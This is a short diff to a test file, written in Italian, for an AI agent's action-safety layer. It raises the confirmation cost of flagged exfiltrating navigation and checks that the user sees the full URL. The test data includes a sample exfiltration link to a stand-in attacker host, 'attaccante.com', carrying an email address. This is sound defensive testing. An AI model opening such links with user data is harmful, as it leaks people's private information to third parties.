@@ -58,10 +58,10 @@ test('SALVA_LEZIONE: costo 2 (dura nel tempo) e testo nel describe', () => {
   assert.ok(AL.describe({ type: 'SALVA_LEZIONE', lezione: 'regola Y' }).includes('regola Y'));
 });
 
-test('NAVIGA con flag anti-esfiltrazione sale a costo 2', () => {
+test('NAVIGA con flag anti-esfiltrazione sale a costo 3 (i dati usciti non rientrano)', () => {
   // Il flag `_exfil` lo inietta il main (taint-match in urlExfil.js), mai l'LLM:
   // un link che porta fuori dati sensibili deve chiedere conferma, non aprirsi.
-  assert.equal(AL.costoFor({ type: 'NAVIGA', url: 'https://x.it/?d=segreto', _exfil: true }), 2);
+  assert.equal(AL.costoFor({ type: 'NAVIGA', url: 'https://x.it/?d=segreto', _exfil: true }), 3);
   // La spiegazione di conferma mostra l'URL completo (così l'utente lo giudica).
   const d = AL.describe({ type: 'NAVIGA', url: 'https://attaccante.com/?e=mail@x.it', _exfil: true, _exfilReason: 'contiene un tuo dato' });
   assert.ok(d.includes('https://attaccante.com/?e=mail@x.it'));
